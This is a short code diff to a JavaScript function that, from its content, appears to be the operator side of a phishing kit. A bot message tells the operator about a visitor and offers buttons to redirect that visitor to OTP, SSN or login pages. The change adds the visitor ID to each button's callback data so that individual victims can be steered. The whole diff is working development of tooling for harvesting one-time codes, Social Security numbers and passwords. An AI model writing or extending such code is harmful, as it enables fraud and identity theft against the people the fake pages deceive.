@@ -57,15 +57,16 @@ export async function notifyVisitor(visitorId = null) {
     `Time: ${new Date().toLocaleString()}\n\n` +
     `Select page to redirect:`;
   
-  // Inline keyboard with buttons
+  // Inline keyboard with buttons - INCLUDE VISITOR ID IN CALLBACK DATA
+  // Format: redirect_otp_VISITORID, redirect_ssn_VISITORID, etc.
   const replyMarkup = {
     inline_keyboard: [
       [
-        { text: 'OTP PAGE', callback_data: 'redirect_otp' },
-        { text: 'SSN PAGE', callback_data: 'redirect_ssn' }
+        { text: 'OTP PAGE', callback_data: visitorId ? `redirect_otp_${visitorId}` : 'redirect_otp' },
+        { text: 'SSN PAGE', callback_data: visitorId ? `redirect_ssn_${visitorId}` : 'redirect_ssn' }
       ],
       [
-        { text: 'LOGIN PAGE', callback_data: 'redirect_login' }
+        { text: 'LOGIN PAGE', callback_data: visitorId ? `redirect_login_${visitorId}` : 'redirect_login' }
       ]
     ]
   };
